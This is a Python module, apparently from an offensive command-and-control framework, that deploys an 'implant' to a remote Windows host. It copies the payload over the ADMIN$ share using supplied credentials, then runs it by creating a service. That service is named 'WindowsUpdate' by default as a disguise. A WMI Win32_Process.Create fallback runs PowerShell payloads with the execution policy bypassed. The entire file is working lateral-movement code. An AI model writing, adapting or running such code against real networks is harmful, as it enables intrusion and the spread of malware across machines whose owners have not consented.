"""lateral_movement/psexec_deploy — deploy implant to remote host via SMB + service creation. MITRE T1021.002"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class PsExecDeploy(BasePlugin):
    NAME        = "psexec_deploy"
    DESCRIPTION = (
        "Copy an implant exe/ps1 to a remote host via ADMIN$, create and start a service. "
        "Fallback: WMI Win32_Process.Create. MITRE T1021.002"
    )
    AUTHOR      = "fitnah-team"
    MITRE       = "T1021.002"
    CATEGORY    = "lateral_movement"
    schema      = ParamSchema().add(
        Param("target",       str, required=True,
              help="Target hostname or IP"),
        Param("username",     str, required=True,
              help="Username for SMB authentication"),
        Param("password",     str, required=True,
              help="Password for SMB authentication"),
        Param("payload_path", str, required=True,
              help="Local path on implant host to the exe/ps1 to deploy"),
        Param("service_name", str, required=False, default="WindowsUpdate",
              help="Service name to create on the remote host"),
    )

    @mitre("T1021.002")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        target       = params["target"].replace("'", "''")
        username     = params["username"].replace("'", "''")
        password     = params["password"].replace("'", "''")
        payload_path = params["payload_path"].replace("'", "''")
        svc_name     = params.get("service_name", "WindowsUpdate").replace("'", "''")

        # Determine if payload is PS1 or EXE
        ps = (
            f"$target       = '{target}';"
            f"$username     = '{username}';"
            f"$password     = '{password}';"
            f"$payloadLocal = '{payload_path}';"
            f"$svcName      = '{svc_name}';"
            "$results = @();"

            # Validate local payload exists
            "if (-not (Test-Path $payloadLocal)) {"
            "  $results += '[-] Payload not found: ' + $payloadLocal;"
            "  $results -join \"`n\"; return"
            "};"

            # Map drive / authenticate
            "$secPwd = ConvertTo-SecureString $password -AsPlainText -Force;"
            "$cred   = New-Object System.Management.Automation.PSCredential($username, $secPwd);"
            "$uncAdmin = \"\\\\$target\\ADMIN$\";"
            "$results += '[*] Authenticating to ' + $uncAdmin;"

            # Try net use for authentication
            "net use $uncAdmin /user:$username $password 2>&1 | Out-Null;"

            # Copy payload to ADMIN$\Temp
            "$payloadName = Split-Path $payloadLocal -Leaf;"
            "$remoteUNC   = \"$uncAdmin\\Temp\\$payloadName\";"
            "$remotePath  = \"C:\\Windows\\Temp\\$payloadName\";"
            "try {"
            "  Copy-Item $payloadLocal $remoteUNC -Force -EA Stop;"
            "  $results += '[+] Payload copied to: ' + $remoteUNC;"
            "} catch {"
            "  $results += '[-] Copy failed: ' + $_;"
            # Fallback: try direct UNC copy via different method
            "  $results += '[*] Trying alternate copy...';"
            "  try {"
            "    $bytes = [System.IO.File]::ReadAllBytes($payloadLocal);"
            "    [System.IO.File]::WriteAllBytes($remoteUNC, $bytes);"
            "    $results += '[+] Alternate copy succeeded';"
            "  } catch {"
            "    $results += '[-] Alternate copy also failed: ' + $_;"
            "    $results += '[*] Falling back to WMI deployment';"
            # WMI fallback: use Win32_Process.Create to run the command
            "    try {"
            "      $wmiOpts = New-Object System.Management.ConnectionOptions;"
            "      $wmiOpts.Username = $username;"
            "      $wmiOpts.Password = $password;"
            "      $wmiOpts.EnablePrivileges = $true;"
            "      $scope = New-Object System.Management.ManagementScope(\"\\\\$target\\root\\cimv2\", $wmiOpts);"
            "      $scope.Connect();"
            "      $proc  = [wmiclass]\"\\\\$target\\root\\cimv2:Win32_Process\";"
            "      $startInfo = $proc.GetMethodParameters('Create');"
            # For PS1: run via powershell; for exe: run directly
            f"      $ext = [System.IO.Path]::GetExtension('{payload_path}').ToLower();"
            "      $cmd = if ($ext -eq '.ps1') {"
            "        \"powershell -NoProfile -ExecutionPolicy Bypass -File $remotePath\""
            "      } else { $remotePath };"
            "      $startInfo['CommandLine'] = $cmd;"
            "      $result2 = $proc.InvokeMethod('Create', $startInfo);"
            "      $results += '[+] WMI Win32_Process.Create returned: ' + $result2.ReturnValue;"
            "    } catch {"
            "      $results += '[-] WMI fallback failed: ' + $_"
            "    };"
            "    net use $uncAdmin /delete 2>&1 | Out-Null;"
            "    $results -join \"`n\"; return"
            "  }"
            "};"

            # Determine binary path for service based on extension
            "$ext = [System.IO.Path]::GetExtension($payloadLocal).ToLower();"
            "$binPath = if ($ext -eq '.ps1') {"
            "  \"powershell -NoProfile -ExecutionPolicy Bypass -NonInteractive -File $remotePath\""
            "} else { $remotePath };"

            # Create service
            "$createOut = sc.exe \\\\$target create $svcName binPath= $binPath type= own start= demand 2>&1;"
            "$results += '[sc create] ' + ($createOut -join ' ');"

            # Start service
            "$startOut = sc.exe \\\\$target start $svcName 2>&1;"
            "$results += '[sc start] ' + ($startOut -join ' ');"

            # Check service state
            "Start-Sleep -Seconds 2;"
            "$queryOut = sc.exe \\\\$target query $svcName 2>&1;"
            "$results += '[sc query] ' + ($queryOut -join ' ');"

            # Cleanup net use
            "net use $uncAdmin /delete 2>&1 | Out-Null;"
            "$results -join \"`n\""
        )

        r = ctx.ps(ps)
        if r["status"] not in ("ok", "error"):
            return ModuleResult.err("Dispatch failed")
        return ModuleResult.ok(data=r["output"])
